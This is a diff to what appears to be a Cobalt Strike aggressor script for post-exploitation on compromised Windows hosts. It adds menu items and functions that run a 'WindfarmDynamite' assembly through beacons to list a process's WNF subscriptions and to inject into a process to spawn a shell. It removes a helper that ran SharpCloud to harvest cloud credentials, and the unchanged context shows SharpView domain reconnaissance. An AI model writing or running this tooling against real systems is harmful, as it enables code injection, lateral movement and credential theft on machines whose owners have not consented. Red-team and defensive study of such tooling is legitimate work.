@@ -402,6 +402,22 @@ item "Suspend Process  - T1057"{
                 }, $bids => $1, $2));
 			}
 }
+
+# WindfarmDynamite - List all WNF subscriptions for a specific process	
+item "WindfarmDynamite - List all WNF subscriptions for a specific process"{
+	local ('$bid');
+		foreach $bid ($1){
+			wnflist($bid);
+		}
+	}
+	
+# WindfarmDynamite - Spawn a New Shell Utilizing WNF	
+item "WindfarmDynamite - Spawn a New Shell Utilizing WNF"{
+	local ('$bid');
+		foreach $bid ($1){
+			wnfinject($bid);
+		}
+	}
 }
 
 
@@ -547,11 +563,6 @@ sub finddomainshare{
 bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Find-DomainShare");
 }
 
-# Cloud Creds
-sub cloudcreds{
-bexecute_assembly($1, script_resource('/exe/SharpCloud.exe'), "all");
-}
-
 # SharpView Find Interesting Domain Shares
 sub findinterestingdomainsharefile{
 bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Find-InterestingDomainShareFile");
@@ -675,5 +686,20 @@ bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-WMIProcess");
 sub getremotewmiprocesses{
 prompt_text("Remote Machine - (FQDN)", "", lambda({
 bexecute_assembly($bids, script_resource('/exe/SharpView.exe'), "Get-WMIProcess -ComputerName $1");
+}, $bids => $1));
+}
+
+# WindfarmDynamite - List all WNF subscriptions for a specific process
+sub wnflist{
+prompt_text("Process ID:", "", lambda({
+bexecute_assembly($bids, script_resource('/exe/WindfarmDynamite.exe '), "-l $1");
+}, $bids => $1));
+}
+
+
+# WindfarmDynamite - Spawn a New Shell Utilizing WNF
+sub wnfinject{
+prompt_text("Process ID:", "", lambda({
+bexecute_assembly($bids, script_resource('/exe/WindfarmDynamite.exe '), "-i $1");
 }, $bids => $1));
 }
